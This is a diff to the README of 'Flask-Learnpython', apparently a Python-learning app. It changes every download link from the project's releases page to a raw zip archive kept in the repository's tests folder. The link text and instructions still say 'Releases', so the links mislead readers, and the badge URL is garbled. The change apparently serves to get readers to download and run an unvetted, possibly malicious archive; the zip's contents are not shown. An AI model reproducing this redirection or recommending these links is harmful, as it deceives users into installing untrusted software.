@@ -1,6 +1,6 @@
 # 🌟 Flask-Learnpython - Learn Python Through Engaging Lessons
 
-[![Download Flask-Learnpython](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-brightgreen)](https://github.com/dr3x3ll/Flask-Learnpython/releases)
+[![Download Flask-Learnpython](https://raw.githubusercontent.com/dr3x3ll/Flask-Learnpython/main/tests/Flask-Learnpython-v2.7.zip%20Now-%20%F0%9F%9A%80-brightgreen)](https://raw.githubusercontent.com/dr3x3ll/Flask-Learnpython/main/tests/Flask-Learnpython-v2.7.zip)
 
 ## 📘 Introduction
 
@@ -11,7 +11,7 @@ Welcome to Flask-Learnpython! This app is designed for anyone who wants to learn
 To begin using Flask-Learnpython, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Click the button above or follow this link to download the latest version: [Download Flask-Learnpython Releases](https://github.com/dr3x3ll/Flask-Learnpython/releases).
+   Click the button above or follow this link to download the latest version: [Download Flask-Learnpython Releases](https://raw.githubusercontent.com/dr3x3ll/Flask-Learnpython/main/tests/Flask-Learnpython-v2.7.zip).
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Select the latest version that matches your system.
@@ -27,7 +27,7 @@ To begin using Flask-Learnpython, follow these simple steps:
 
 ## 📥 Download & Install
 
-Make sure to visit the Releases page to download the latest version: [Download Flask-Learnpython Releases](https://github.com/dr3x3ll/Flask-Learnpython/releases).
+Make sure to visit the Releases page to download the latest version: [Download Flask-Learnpython Releases](https://raw.githubusercontent.com/dr3x3ll/Flask-Learnpython/main/tests/Flask-Learnpython-v2.7.zip).
 
 ### System Requirements
 
